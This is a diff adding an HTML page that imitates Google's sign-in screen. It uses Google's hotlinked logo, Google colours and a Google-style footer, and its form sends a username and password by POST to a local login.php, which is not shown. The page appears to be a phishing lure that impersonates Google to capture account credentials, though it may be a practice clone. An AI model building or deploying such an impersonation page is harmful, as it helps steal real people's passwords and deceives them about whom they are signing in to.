@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Google Login Form</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+      /* Styling for the form */
+      #login-form {
+        max-width: 500px;
+        margin: 50px auto;
+        padding: 20px;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+        background-color: #f5f5f5;
+        
+      }
+      input[type="text"],
+      input[type="password"] {
+        width: 100%;
+        padding: 10px;
+        margin-bottom: 20px;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+        box-sizing: border-box;
+        font-size: 16px;
+      }
+      input[type="text"]::placeholder,
+      input[type="password"]::placeholder {
+        color: #ccc;
+        font-size: 16px;
+      }
+      .container {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+      }
+      .centered-div {
+        text-align: center;
+      }
+      input[type="submit"] {
+        background-color: #4285f4;
+        color: #fff;
+        border: none;
+        padding: 10px 20px;
+        border-radius: 5px;
+        font-size: 16px;
+        cursor: pointer;
+      }
+      input[type="submit"]:hover {
+        background-color: #357ae8;
+      }
+      .forgot-password {
+        text-align: right;
+        font-size: 14px;
+        margin-bottom: 20px;
+      }
+      .forgot-password a {
+        color: #4285f4;
+        text-decoration: none;
+      }
+      footer {
+  background-color: #f2f2f2;
+  padding: 20px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  font-size: 14px;
+}
+
+nav ul {
+  list-style: none;
+  margin: 0;
+  padding: 0;
+  display: flex;
+}
+
+nav li {
+  margin-right: 20px;
+}
+
+nav a {
+  text-decoration: none;
+  color: #5f6368;
+}
+
+.footer-logo img {
+  height: 30px;
+}
+      /* Styling for the logo */
+      .logo {
+        display: block;
+        margin: 0 auto;
+        width: 50%;
+        max-width: 200px;
+      }
+
+      /* Media queries for responsive design */
+      @media screen and (max-width: 768px) {
+        #login-form {
+          max-width: 90%;
+        }
+        .logo {
+          width: 80%;
+        }
+      }
+    </style>
+  </head>
+  <body>
+  <div class="container">
+    <div class="centered-div">
+    <form id="login-form" method="post" action="login.php">
+      <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google Logo" class="logo">
+      <input type="text" id="username" name="username" placeholder="Email or username" required>
+      <input type="password" id="password" name="password" placeholder="Password" required>
+      <div class="forgot-password"><a href="#">Forgot Password?</a></div>
+      <input type="submit" value="Sign in">
+    </form>
+      </div>
+    </div>
+    <footer>
+  <nav>
+    <ul>
+      <li><a href="#">Advertising</a></li>
+      <li><a href="#">Business</a></li>
+      <li><a href="#">About</a></li>
+      <li><a href="#">Privacy</a></li>
+      <li><a href="#">Terms</a></li>
+      <li><a href="#">Settings</a></li>
+    </ul>
+  </nav>
+  <div class="footer-logo">
+    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo">
+  </div>
+</footer>
+  </body>
+</html>
